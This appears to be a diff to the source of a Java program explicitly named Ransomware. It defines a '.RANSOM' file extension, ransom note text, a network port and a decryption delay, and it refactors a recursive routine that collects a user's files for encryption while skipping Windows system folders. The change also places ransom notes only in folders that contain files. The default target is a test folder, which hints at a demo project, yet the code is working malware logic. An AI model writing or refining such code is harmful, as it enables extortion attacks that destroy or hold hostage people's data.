@@ -1,5 +1,3 @@
-package ransomware;
-
 import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileNotFoundException;
@@ -33,10 +31,10 @@ import javax.crypto.spec.SecretKeySpec;
 public class Ransomware {
 	
 	// In milliseconds, how long to wait before things are decrypted.
-	private static final int DECRYPTION_DELAY = 10000;
+	private static final int DECRYPTION_DELAY = 100000;
 	private static final int IV_LENGTH = 16;
 	private static final String TARGET_DIR = System.getProperty("user.home") + File.separator + 
-	"Desktop"+ File.separator  + "testFolder";
+			"Desktop" + File.separator + "testFolder";
 	private static final String EXTENSION = ".RANSOM";
 	private static final int PORT_NUM = 2435;
 	private static final String RANSOM_TEXT = "You have been hit by ransomware! Your files will be "
@@ -144,28 +142,32 @@ public class Ransomware {
 	
 	private static void getAllFiles(String directoryName, List<File> files, boolean placeNote) {
 	    File directory = new File(directoryName);
-
-    	if(placeNote) {
-    		placeRansomNote(directory);
-    	}
+	    File[] fileList = directory.listFiles();
     	
-	    File[] fList = directory.listFiles();
-	    if(fList != null) {
-	        for (File file : fList) {      
+    	int numFiles = 0;
+	    if(fileList != null) {
+	        for (File file : fileList) {      
 	            if (file.isFile()) {
 	                files.add(file);
+	                numFiles++;
 	            } else if (file.isDirectory()) {
 	            	// Skip over Windows OS folders
-	            	if(!(file.getAbsolutePath().equals("C:\\Program Files") ||
-	            	   file.getAbsolutePath().equals("C:\\Program Files (x86)") ||
-	            	   file.getAbsolutePath().equals("C:\\Windows"))) 
+	            	String dirName = file.getAbsolutePath();
+	            	if(!(dirName.equals("C:\\Program Files") ||
+	            			dirName.equals("C:\\Program Files (x86)") ||
+	            			dirName.equals("C:\\Windows"))) 
 	            	{
-		            	getAllFiles(file.getAbsolutePath(), files, placeNote);
+			            getAllFiles(file.getAbsolutePath(), files, placeNote);
 	            	}
 
 	            }
 	        }
 	    }
+	    
+	    // Only place a ransom note in folders with encrypted files
+    	if(placeNote && numFiles > 0) {
+    		placeRansomNote(directory);
+    	}
 	}
 	
 	
